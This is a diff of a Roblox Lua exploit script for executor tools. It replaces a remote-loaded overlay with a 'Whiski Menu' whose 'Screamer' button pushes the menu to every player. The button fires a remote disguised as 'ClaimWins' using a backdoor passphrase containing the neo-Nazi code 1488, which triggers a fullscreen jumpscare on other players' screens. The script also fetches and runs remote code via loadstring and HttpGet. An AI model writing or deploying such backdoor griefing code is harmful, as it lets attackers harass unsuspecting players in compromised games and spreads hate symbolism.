@@ -1,190 +1,159 @@
--- main.lua - Для Sirius / Delta Executor с Rayfield UI
--- GitHub raw: залей и выполняй через loadstring
+-- gui.lua (заливаешь на GitHub)
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
 
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local player = Players.LocalPlayer
+local mouse = player:GetMouse()
 
-local Window = Rayfield:CreateWindow({
-    Name = "Whiski Overlay",
-    Icon = 0,
-    LoadingTitle = "WhiskiSoul Mod",
-    LoadingSubtitle = "by Whiski",
-    ConfigurationSaving = {
-        Enabled = true,
-        FolderName = "WhiskiConfig",
-        FileName = "WhiskiSettings"
-    },
-    KeySystem = false
-})
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "WhiskiMenu"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
 
-local MainTab = Window:CreateTab("Display", 0)
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 400)
+frame.Position = UDim2.new(0.5, -150, 0.5, -200)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+frame.BackgroundTransparency = 0.05
+frame.BorderSizePixel = 0
+frame.ClipsDescendants = true
+frame.Parent = screenGui
 
-local isActive = false
-local textLabel = nil
-local bgFrame = nil
-local pulseCoroutine = nil
-local colorCoroutine = nil
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = frame
 
-local function createOverlay()
-    if textLabel then return end
-    
-    local sg = Instance.new("ScreenGui")
-    sg.Name = "WhiskiOverlay"
-    sg.ResetOnSpawn = false
-    sg.Parent = game:GetService("CoreGui")
-    
-    bgFrame = Instance.new("Frame")
-    bgFrame.Size = UDim2.new(1, 0, 1, 0)
-    bgFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-    bgFrame.BackgroundTransparency = 0.8
-    bgFrame.Visible = false
-    bgFrame.Parent = sg
-    
-    textLabel = Instance.new("TextLabel")
-    textLabel.Size = UDim2.new(1, 0, 1, 0)
-    textLabel.Position = UDim2.new(0, 0, 0, 0)
-    textLabel.BackgroundTransparency = 1
-    textLabel.Text = "WHISKITHEBEST"
-    textLabel.TextColor3 = Color3.new(1, 0, 0)
-    textLabel.TextScaled = true
-    textLabel.Font = Enum.Font.BlackOpsOne
-    textLabel.TextStrokeColor3 = Color3.new(0.3, 0, 0)
-    textLabel.TextStrokeTransparency = 0.1
-    textLabel.Visible = false
-    textLabel.Parent = sg
-    
-    local glow = Instance.new("UIStroke")
-    glow.Color = Color3.new(1, 0, 0)
-    glow.Thickness = 6
-    glow.Transparency = 0.6
-    glow.Parent = textLabel
-end
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "Whiski Menu"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = frame
 
-local function stopAnimations()
-    if pulseCoroutine then task.cancel(pulseCoroutine) end
-    if colorCoroutine then task.cancel(colorCoroutine) end
-    pulseCoroutine = nil
-    colorCoroutine = nil
-end
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 30, 0, 30)
+closeBtn.Position = UDim2.new(1, -35, 0, 5)
+closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+closeBtn.BackgroundTransparency = 0.3
+closeBtn.Text = "X"
+closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeBtn.TextScaled = true
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.Parent = frame
 
-local function startPulse()
-    stopAnimations()
-    pulseCoroutine = task.spawn(function()
-        local dir = 1
-        local scale = 0.9
-        while isActive do
-            scale = scale + (dir * 0.003)
-            if scale >= 1.1 then dir = -1 end
-            if scale <= 0.9 then dir = 1 end
-            if textLabel then
-                textLabel.Size = UDim2.new(scale, 0, scale, 0)
-            end
-            task.wait(0.016)
-        end
-        if textLabel then
-            textLabel.Size = UDim2.new(1, 0, 1, 0)
-        end
-    end)
-    
-    colorCoroutine = task.spawn(function()
-        local hue = 0
-        while isActive do
-            hue = (hue + 0.005) % 1
-            local r = math.sin(hue * 2 * math.pi) * 0.3 + 0.7
-            if textLabel then
-                textLabel.TextColor3 = Color3.new(r, 0.05, 0.05)
-            end
-            task.wait(0.05)
-        end
-        if textLabel then
-            textLabel.TextColor3 = Color3.new(1, 0, 0)
-        end
-    end)
-end
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(1, 0)
+closeCorner.Parent = closeBtn
 
-local function toggleDisplay()
-    if not textLabel then createOverlay() end
-    isActive = not isActive
-    textLabel.Visible = isActive
-    bgFrame.Visible = isActive
-    
-    if isActive then
-        startPulse()
-    else
-        stopAnimations()
-    end
-end
+closeBtn.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
 
-MainTab:CreateButton({
-    Name = "▶ TOGGLE WHISKITHEBEST",
-    Callback = function()
-        toggleDisplay()
-        Rayfield:Notify({
-            Title = "Whiski",
-            Content = isActive and "Overlay ON" or "Overlay OFF",
-            Duration = 1.5
-        })
-    end
-})
+local drag = {
+    dragging = false,
+    offset = Vector2.new()
+}
 
-local SettingsTab = Window:CreateTab("Settings", 1)
-
-SettingsTab:CreateSlider({
-    Name = "Base Scale",
-    Range = {50, 150},
-    Increment = 5,
-    Suffix = "%",
-    CurrentValue = 100,
-    Flag = "ScaleSlider",
-    Callback = function(v)
-        if textLabel then
-            textLabel.TextScaled = false
-            textLabel.TextSize = v
-        end
-    end
-})
-
-SettingsTab:CreateSlider({
-    Name = "Background Opacity",
-    Range = {0, 100},
-    Increment = 5,
-    Suffix = "%",
-    CurrentValue = 80,
-    Flag = "BgOpacity",
-    Callback = function(v)
-        if bgFrame then
-            bgFrame.BackgroundTransparency = 1 - (v / 100)
-        end
-    end
-})
-
-SettingsTab:CreateToggle({
-    Name = "Enable Pulse Effect",
-    CurrentValue = true,
-    Flag = "PulseToggle",
-    Callback = function(state)
-        if state and isActive then
-            startPulse()
-        elseif not state then
-            stopAnimations()
-            if textLabel then
-                textLabel.Size = UDim2.new(1, 0, 1, 0)
-            end
-        end
-    end
-})
-
--- Горячая клавиша M
-game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
-    if gp then return end
-    if input.KeyCode == Enum.KeyCode.M then
-        toggleDisplay()
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        drag.dragging = true
+        drag.offset = Vector2.new(mouse.X - frame.AbsolutePosition.X, mouse.Y - frame.AbsolutePosition.Y)
     end
 end)
 
-Rayfield:Notify({
-    Title = "Whiski Mod",
-    Content = "Loaded! Press M to toggle",
-    Duration = 3
-})
+frame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        drag.dragging = false
+    end
+end)
 
-Rayfield:LoadConfiguration()
+game:GetService("RunService").Heartbeat:Connect(function()
+    if drag.dragging then
+        frame.Position = UDim2.new(0, mouse.X - drag.offset.X, 0, mouse.Y - drag.offset.Y)
+    end
+end)
+
+local buttonY = 50
+local function CreateButton(text, callback)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0.9, 0, 0, 40)
+    btn.Position = UDim2.new(0.05, 0, 0, buttonY)
+    btn.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    btn.BackgroundTransparency = 0.3
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextScaled = true
+    btn.Font = Enum.Font.Gotham
+    btn.Parent = frame
+    
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 6)
+    btnCorner.Parent = btn
+    
+    btn.MouseButton1Click:Connect(callback)
+    
+    buttonY = buttonY + 50
+    return btn
+end
+
+local function Screamer()
+    local screamerGui = Instance.new("ScreenGui")
+    screamerGui.Name = "Screamer"
+    screamerGui.ResetOnSpawn = false
+    screamerGui.IgnoreGuiInset = true
+    screamerGui.Parent = player:WaitForChild("PlayerGui")
+    
+    local image = Instance.new("ImageLabel")
+    image.Size = UDim2.new(1, 0, 1, 0)
+    image.Position = UDim2.new(0, 0, 0, 0)
+    image.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    image.Image = "rbxassetid://89956031378786"
+    image.ScaleType = Enum.ScaleType.Fit
+    image.Parent = screamerGui
+    
+    local rotation = 0
+    local connection = game:GetService("RunService").RenderStepped:Connect(function()
+        rotation = rotation + 15
+        image.Rotation = rotation
+    end)
+    
+    task.wait(5)
+    connection:Disconnect()
+    screamerGui:Destroy()
+end
+
+CreateButton("Screamer (Fullscreen)", function()
+    for _, plr in ipairs(Players:GetPlayers()) do
+        local guiClone = screenGui:Clone()
+        guiClone.Parent = plr:WaitForChild("PlayerGui")
+        
+        local cloneFrame = guiClone:FindFirstChild("Frame")
+        if cloneFrame then
+            for _, btn in ipairs(cloneFrame:GetChildren()) do
+                if btn:IsA("TextButton") and btn.Text == "Screamer (Fullscreen)" then
+                    btn.MouseButton1Click:Connect(function()
+                        local rem = ReplicatedStorage:FindFirstChild("ClaimWins")
+                        if rem then
+                            rem:FireServer("WhiskiBekdorTheBest1488", "screamer")
+                        end
+                    end)
+                end
+            end
+        end
+    end
+end)
+
+local rem = ReplicatedStorage:FindFirstChild("ClaimWins")
+if rem then
+    rem.OnClientEvent:Connect(function(action, ...)
+        if action == "screamer" then
+            Screamer()
+        end
+    end)
+end
+
+print("Whiski Menu loaded")
